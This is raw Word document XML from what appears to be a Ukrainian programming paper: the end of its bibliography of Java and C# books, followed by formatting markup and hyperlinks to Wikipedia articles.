          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>посібник</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> по </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>стандартній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мові</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об'єктного</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моделювання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. - Символ Плюс, 2006. - 501 с.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Шілдт</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Г., Холмс Д. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Мистецтво</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програмування</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> на </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. - </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>М .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Видавничий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дім</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Вільямс</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">", 2005. - 336 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>стор</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId64" w:history="1">
        <w:r w:rsidRPr="00A7731B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="uk-UA"/>
          </w:rPr>
          <w:t>https://metanit.com/sharp/tutorial/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Албахарі</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Д., </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Албахарі</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Б.C # 6.0. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Довідник</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Повний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опис</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мови</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. 6-е изд. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Київ</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2016 - 1040</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Подбельский</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> В.В. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Мова</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> C #. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Базовий</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> курс. 2-е изд.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pP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sectPr w:rsidR="0060216E" w:rsidRPr="00602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2"/>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Num4"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:cs="Times New Roman"/>
        <w:sz w:val="2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00000004"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00000004"/>
    <w:name w:val="WWNum5"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>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Num6"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>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Num7"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:cs="Times New Roman"/>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name w:val="WWNum9"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
        <w:sz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B835E1D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F806B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204AE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8BAE1770"/>
    <w:lvl w:ilvl="0" w:tplc="3DBE17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35498"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7A1AB7B4"/>
    <w:lvl w:ilvl="0" w:tplc="E71A6400">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1120" w:hanging="41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1412309A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="89B8EC7E"/>
    <w:lvl w:ilvl="0" w:tplc="3DBE174E">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0" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="15700B43"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7AE07570"/>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8C103A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00000001"/>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4C00270"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="501A878A"/>
    <w:lvl w:ilvl="0" w:tplc="3F144376">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1EFB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161D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7807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CB5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7EE5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A45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C4C5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67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075420B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A6244622"/>
    <w:lvl w:ilvl="0" w:tplc="3DBE17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4702D7"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="557E533C"/>
    <w:lvl w:ilvl="0" w:tplc="3DBE17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7208C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00000001"/>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1BF5A14"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F8C2AEFE"/>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D70946"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DC5EC582"/>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73E7C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C1D6E2AC"/>
    <w:lvl w:ilvl="0" w:tplc="3DBE17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72F7D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="185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90CAF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00000001"/>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4ED66F2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="18B2BBC2"/>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1"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="5"/>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62"/>
    <w:rsid w:val="00073DDF"/>
    <w:rsid w:val="000D4056"/>
    <w:rsid w:val="0014003D"/>
    <w:rsid w:val="001826E6"/>
    <w:rsid w:val="001A6C53"/>
    <w:rsid w:val="00322095"/>
    <w:rsid w:val="005307A3"/>
    <w:rsid w:val="005E0F40"/>
    <w:rsid w:val="005E2C4B"/>
    <w:rsid w:val="0060216E"/>
    <w:rsid w:val="006D07EF"/>
    <w:rsid w:val="007D0939"/>
    <w:rsid w:val="00804E28"/>
    <w:rsid w:val="00853AAF"/>
    <w:rsid w:val="00872F21"/>
    <w:rsid w:val="009405C5"/>
    <w:rsid w:val="00AC0787"/>
    <w:rsid w:val="00B420AE"/>
    <w:rsid w:val="00BA3D32"/>
    <w:rsid w:val="00C95742"/>
    <w:rsid w:val="00CD4D49"/>
    <w:rsid w:val="00CE73AC"/>
    <w:rsid w:val="00DC7E52"/>
    <w:rsid w:val="00DD2596"/>
    <w:rsid w:val="00F33D0A"/>
    <w:rsid w:val="00FD2581"/>
    <w:rsid w:val="00FE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26DF"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{8DEBDD8A-88FF-415A-B38E-F8681229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7D0939"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:after="0"/>
      <w:ind w:right="71"/>
      <w:jc w:val="center"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
      <w:color w:val="000000"/>
      <w:sz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939"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
      <w:color w:val="000000"/>
      <w:sz w:val="36"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="a3">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="a"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00FD2581"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTML">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="a"/>
    <w:link w:val="HTML0"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00AC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C0787"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:eastAsia="ru-RU"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="a4">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="a0"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00073DDF"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="a5">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="a"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006D07EF"/>
    <w:pPr>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="115" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="a6">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="1"/>
    <w:next w:val="a"/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00853AAF"/>
    <w:pPr>
      <w:spacing w:before="240"/>
      <w:ind w:right="0"/>
      <w:jc w:val="left"/>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853AAF"/>
    <w:pPr>
      <w:spacing w:after="100"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="0060216E"/>
    <w:pPr>
      <w:suppressAutoHyphens/>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Calibri" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:color w:val="00000A"/>
      <w:kern w:val="1"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="a"/>
    <w:next w:val="a"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0060216E"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="220"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="a"/>
    <w:next w:val="a"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006021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49692">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1774936377">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="18662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2%D0%B5%D0%BA" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/SQL" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%9C%D0%B0%D1%81%D1%88%D1%82%D0%B0%D0%B1%D0%B8%D1%80%D1%83%D0%B5%D0%BC%D0%BE%D1%81%D1%82%D1%8C" TargetMode="External"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1054;&#1090;&#1082;&#1088;&#1099;&#1090;&#1099;&#1081;_&#1089;&#1090;&#1072;&#1085;&#1076;&#1072;&#1088;&#1090;" TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Java_Data_Objects" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1056;&#1072;&#1079;&#1088;&#1072;&#1073;&#1086;&#1090;&#1082;&#1072;_&#1087;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1085;&#1086;&#1075;&#1086;_&#1086;&#1073;&#1077;&#1089;&#1087;&#1077;&#1095;&#1077;&#1085;&#1080;&#1103;" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1050;&#1086;&#1076;&#1086;&#1075;&#1077;&#1085;&#1077;&#1088;&#1072;&#1094;&#1080;&#1103;" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1050;&#1083;&#1072;&#1089;&#1089;_(&#1087;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1080;&#1077;)" TargetMode="External"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6.png"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1040;&#1085;&#1075;&#1083;&#1080;&#1081;&#1089;&#1082;&#1080;&#1081;_&#1103;&#1079;&#1099;&#1082;" TargetMode="External"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/Java" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%A2%D1%80%D0%B0%D0%BD%D1%81%D0%BB%D1%8F%D1%82%D0%BE%D1%80" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/numbering" Target="numbering.xml"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/HTTP" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/SQLJ" TargetMode="External"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.png"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1057;&#1080;&#1089;&#1090;&#1077;&#1084;&#1072;" TargetMode="External"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" 